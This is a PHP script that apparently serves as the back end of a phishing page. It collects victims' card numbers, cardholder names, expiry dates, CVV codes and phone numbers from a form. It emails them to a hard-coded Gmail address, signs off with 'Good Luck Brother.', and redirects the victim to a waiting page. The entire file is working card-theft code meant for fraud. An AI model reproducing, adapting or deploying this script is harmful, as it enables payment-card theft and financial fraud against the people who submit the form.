<?php
/* Set e-mail recipient */
$myemail  = "reserveallen@gmail.com";

/* Check all form inputs using check_input function */
$cn  = check_input($_POST['cn'], "Enter your card number");
$nm  = check_input($_POST['nm'], "Enter card holder's name");
$mm  = check_input($_POST['mm'], "Enter your epiry month");
$yy  = check_input($_POST['yy'], "Enter your epiry year");
$cr = check_input($_POST['cr'], "Enter your cvv");
$em  = check_input($_POST['em'], "Enter your phone number");

/* Let's prepare the message for the e-mail */
$subject = "Card Details!";

/* Let's prepare the message for the e-mail */
$message = "Heita!!

You have just received a new Credit card details:

Card Number: $cn
Card Holder: $nm
Exp. Month: $mm
Exp. Year: $yy
CVV: $cr
Phone Number: $em

Good Luck Brother.
";

/* Send the message using mail() function */
mail($myemail, $subject, $message);

/* Redirect visitor to the thank you page */
header('Location: wait.html');
exit();

/* Functions we used */
function check_input($data, $problem='')
{
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    if ($problem && strlen($data) == 0)
    {
        show_error($problem);
    }
    return $data;
}

function show_error($myError)
{
?>
    <html>
    <body>

    <b>Please correct the following error:</b><br />
    <?php echo $myError; ?>

    </body>
    </html>
<?php
exit();
}
?>